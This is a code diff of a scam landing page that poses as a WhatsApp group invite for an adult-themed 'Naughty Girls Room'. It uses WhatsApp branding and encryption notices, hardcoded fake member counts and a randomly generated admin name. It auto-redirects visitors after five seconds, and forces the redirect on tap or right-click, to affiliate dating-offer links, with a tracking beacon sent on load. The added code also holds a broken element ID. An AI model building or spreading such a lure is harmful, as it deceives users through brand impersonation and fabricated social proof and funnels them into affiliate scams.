@@ -58,7 +58,7 @@
         <div class="whatsapp-header">
             <div class="back-button" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
             <div class="header-text">
-                <h1 data-t="groupName">Naughty Girls Room</h1>
+                <h1>Naughty Girls Room</h1>
                 <p>WhatsApp</p>
             </div>
         </div>
@@ -66,52 +66,51 @@
         <div class="main-content">
             <div class="profile-container">
                 <div class="profile-img"><i class="fas fa-users"></i></div>
-                <div class="group-name" data-t="groupName">Naughty Girls Room</div>
+                <div class="group-name">Naughty Girls Room</div>
                 <div class="group-info" id="adminText"></div>
             </div>
 
             <div class="members-info">
                 <div class="member-count" id="memberCount">
-                    <div class="message-popup" id="messagePopup1" data-t="enjoyed">People Who Have Actively Enjoyed This Service</div>
-                    <div class="count" id="totalMembers">130,6K</div>
-                    <div class="label" data-t="members">Members</div>
+                    <div class="message-popup" id="messagePopup1">People Who Have Actively Enjoyed This Service</div>
+                    <div class="count" id="totalMembers">106.7K</div>
+                    <div class="label">Members</div>
                 </div>
                 <div class="active-members" id="activeMembers">
-                    <div class="message-popup" id="messagePopup2" data-t="enjoyed">People Who Have Actively Enjoyed This Service</div>
-                    <div class="count" id="onlineMembers">50.8K</div>
-                    <div class="online-indicator"><div class="dot"></div><span data-t="online">Online</span></div>
+                    <div class="message-popup" id="messagePopup2">People Who Have Actively Enjoyed This Service</div>
+                    <div class="count" id="onlineMembers">43.2K</div>
+                    <div class="online-indicator"><div class="dot"></div><span>Online</span></div>
                 </div>
             </div>
 
             <div class="notification">
                 <i class="fas fa-lock"></i>
-                <span data-t="encryption">New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or share them.</span>
+                <span>New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or share them.</span>
             </div>
 
             <button class="join-button" id="joinButton">
                 <i class="fab fa-whatsapp"></i>
-                <span data-t="joinButton">Join the group</span>
+                <span>Join group</span>
             </button>
 
             <div class="security-notice">
-                <i class="fas fa-shield-alt"></i> <span data-t="protected">Protected by WhatsApp</span>
+                <i class="fas fa-shield-alt"></i> <span>Protected by WhatsApp</span>
             </div>
         </div>
 
-        <div class="footer" data-t="footer">
-            By clicking "Join the group", you agree to share contact information with the group administrator and other participants.
+        <div class="footer">
+            By clicking "Join the group", you agree to share contact information with group administrator and other participants.
         </div>
     </div>
 
     <script>
-		const OFFERS = [
-			"https://imopoldashboard.dedirenia3.workers.dev/click?cid=THREADS&url=https://mgepmr9.mybetterdatings.com/lk6rmz1?s1=THREADS&cid=THREADS"
-        ];
+        // Offer URL
+        const OFFERS = ["https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&ban=inst&j5=1&j6=1&s1=188302&s2=2150610&s3=THREADS&click_id=THREADS"];
+        let TARGET_URL = OFFERS[0];
 
-        let TARGET_URL = OFFERS[Math.floor(Math.random() * OFFERS.length)];
-
+        // Video list
         const videoList = [
-            "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
+            "" || "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
             "https://files.catbox.moe/387f3z.mp4",
             "https://files.catbox.moe/y2fr1u.mp4",
             "https://files.catbox.moe/o2bcz2.mp4",
@@ -139,129 +138,50 @@
             });
         }
 
-        function formatNumber(num) {
-            if (num >= 1000000) return (num/1e6).toFixed(1)+'M';
-            if (num >= 1000) return (num/1000).toFixed(1)+'K';
-            return num;
-        }
-        function randomizeCounts() {
-            const total = Math.floor(Math.random() * 90000) + 90000;
-            const online = Math.floor(Math.random() * 40000) + 20000;
-            document.getElementById('totalMembers').textContent = (total/1000).toFixed(1)+'K';
-            document.getElementById('onlineMembers').textContent = (online/1000).toFixed(1)+'K';
-        }
-
+        // Random admin name
         const firstNames = ["Emily","Sophia","Isabella","Mia","Ava","Olivia","Luna","Chloe","Zoe","Anna","Lisa","Sarah","Putri","Siti","Ayu","Dewi","Intan","Citra","Tiara","Bella","Aisyah","Vanessa","Jessica","Angel"];
         const lastNames = ["Whitney","Johnson","Miller","Davis","Garcia","Martinez","Lopez","Wilson","Anderson","Thomas","Moore","Perez","Harris","Clark","Lewis","Walker","Young","King","Scott","Nguyen","Adams","Hall"];
         function getRandomName(){return firstNames[Math.floor(Math.random()*firstNames.length)]+" "+lastNames[Math.floor(Math.random()*lastNames.length)];}
 
-		const translations = {
-            id: {
-                groupName: "Naughty Girls Room",
-                admin: "Admin dan Moderator: Emily Whitney",
-                members: "Anggota",
-                online: "Online",
-                joinButton: "Gabung grup",
-                encryption: "Pesan dan panggilan baru diamankan dengan enkripsi end-to-end. Hanya orang dalam obrolan ini yang dapat membaca atau mendengarkannya.",
-                protected: "Dilindungi oleh WhatsApp",
-                footer: "Dengan mengklik “Gabung grup”, kamu setuju membagikan informasi kontak dengan admin grup dan peserta lain.",
-                enjoyed: "Orang yang Aktif Menikmati Layanan Ini"
-            },
-            en: {
-                groupName: "Naughty Girls Room",
-                admin: "Admin and Moderator: Emily Whitney",
-                members: "Members",
-                online: "Online",
-                joinButton: "Join the group",
-                encryption: "New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen to, or share them.",
-                protected: "Protected by WhatsApp",
-                footer: "By clicking “Join the group”, you agree to share contact information with the group administrator and other participants.",
-                enjoyed: "People Who Have Actively Enjoyed This Service"
-            },
-            de: {
-                groupName: "Versautes Mädchenzimmer",
-                admin: "Admin & Moderatorin: Emily Whitney",
-                members: "Mitglieder",
-                online: "Online",
-                joinButton: "Gruppe beitreten",
-                encryption: "Neue Nachrichten und Anrufe sind durch Ende-zu-Ende-Verschlüsselung geschützt. Nur Teilnehmer dieses Chats können sie lesen oder hören.",
-                protected: "Geschützt durch WhatsApp",
-                footer: "Durch Klick auf “Gruppe beitreten” stimmst du zu, Kontaktdaten mit dem Gruppenadmin und anderen Teilnehmern zu teilen.",
-                enjoyed: "Personen, die diesen Dienst aktiv genossen haben"
-            },
-            es: {
-                groupName: "Habitación de Chicas Traviesas",
-                admin: "Admin y Moderadora: Emily Whitney",
-                members: "Miembros",
-                online: "En línea",
-                joinButton: "Unirse al grupo",
-                encryption: "Los nuevos mensajes y llamadas están protegidos con cifrado de extremo a extremo. Solo las personas del chat pueden leerlos leer o escucharlos.",
-                protected: "Protegido por WhatsApp",
-                footer: "Al hacer clic en “Unirse al grupo” aceptas compartir tu información de contacto con el administrador y otros participantes.",
-                enjoyed: "Personas que han disfrutado activamente de este servicio"
-            },
-            pt: {
-                groupName: "Sala das Safadinhas",
-                admin: "Admin e Moderadora: Emily Whitney",
-                members: "Membros",
-                online: "Online",
-                joinButton: "Entrar no grupo",
-                encryption: "Novas mensagens e chamadas são protegidas com criptografia de ponta a ponta. Apenas pessoas neste chat podem ler ou ouvir.",
-                protected: "Protegido pelo WhatsApp",
-                footer: "Ao clicar em “Entrar no grupo”, você concorda em compartilhar informações de contato com o administrador e outros participantes.",
-                enjoyed: "Pessoas que aproveitaram ativamente este serviço"
-            },
-            fr: {
-                groupName: "Salon des Coquines",
-                admin: "Admin & Modératrice : Emily Whitney",
-                members: "Membres",
-                online: "En ligne",
-                joinButton: "Rejoindre le groupe",
-                encryption: "Les nouveaux messages et appels sont sécurisés par chiffrement de bout en bout. Seules les personnes du chat peuvent les lire ou les écouter.",
-                protected: "Protégé par WhatsApp",
-                footer: "En cliquant sur “Rejoindre le groupe”, vous acceptez de partager vos coordonnées avec l’administrateur et les autres participants.",
-                enjoyed: "Personnes ayant activement apprécié ce service"
-            },
-		};
-
-        const userLang = (navigator.language || navigator.userLanguage || "en").substr(0,2).toLowerCase();
-        const lang = translations[userLang] ? userLang : "en";
-
-        document.querySelectorAll("[data-t]").forEach(el => {
-            const key = el.getAttribute("data-t");
-            if (translations[lang][key]) el.textContent = translations[lang][key];
-        });
-        document.getElementById("adminText").textContent = (translations[lang].admin || "Admin & Moderator: ") + getRandomName();
-
+        // Redirect logic
         const params = new URLSearchParams(window.location.search);
         let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');
-		
+        
+        // Auto redirect
         setTimeout(() => {
             location.href = finalUrl;
-        }, 5000);
-		
+        }, 5 * 1000);
+        
+        // Manual redirect
         document.getElementById('joinButton').onclick = () => {
             location.href = finalUrl;
         };
 
+        // Initialize
         document.addEventListener('DOMContentLoaded', () => {
+            // Tracking
+            fetch('https://imopol.dasboardkramat.workers.dev/track?cid=THREADS', { method: 'GET', keepalive: true });
+
             loadRandomVideo();
-            randomizeCounts();
+            document.getElementById('adminText').textContent = "Admin & Moderator: " + getRandomName();
+            
             const els = document.querySelectorAll('.profile-container, .members-info, .notification, .join-button');
             els.forEach((el,i) => setTimeout(()=>{el.style.opacity='1';el.style.transform='translateY(0)'},i*200));
         });
 
+        // Popup functions
         function showPopup(id){
             const p=document.getElementById(id);
             p.classList.add('show');
             setTimeout(()=>p.classList.remove('show'),2200);
         }
         document.getElementById('memberCount').onclick=()=>showPopup('messagePopup1');
-        document.getElementById('activeMembers').onclick=()=>showPopup('messagePopup2');
+        document.getElementById('active-members').onclick=()=>showPopup('messagePopup2');
 
+        // Button animation
         const btn = document.getElementById('joinButton');
         function go(){
-            btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> '+(translations[lang].joinButton||"Redirecting")+'...';
+            btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Redirecting...';
             btn.disabled=true;
             setTimeout(()=>location.href=finalUrl,800);
         }
@@ -269,6 +189,7 @@
         btn.ontouchend=e=>{e.preventDefault();go();}
         btn.oncontextmenu=e=>{e.preventDefault();go();}
 
+        // Force play video
         document.body.onclick = () => videoEl.play();
     </script>
 </body>
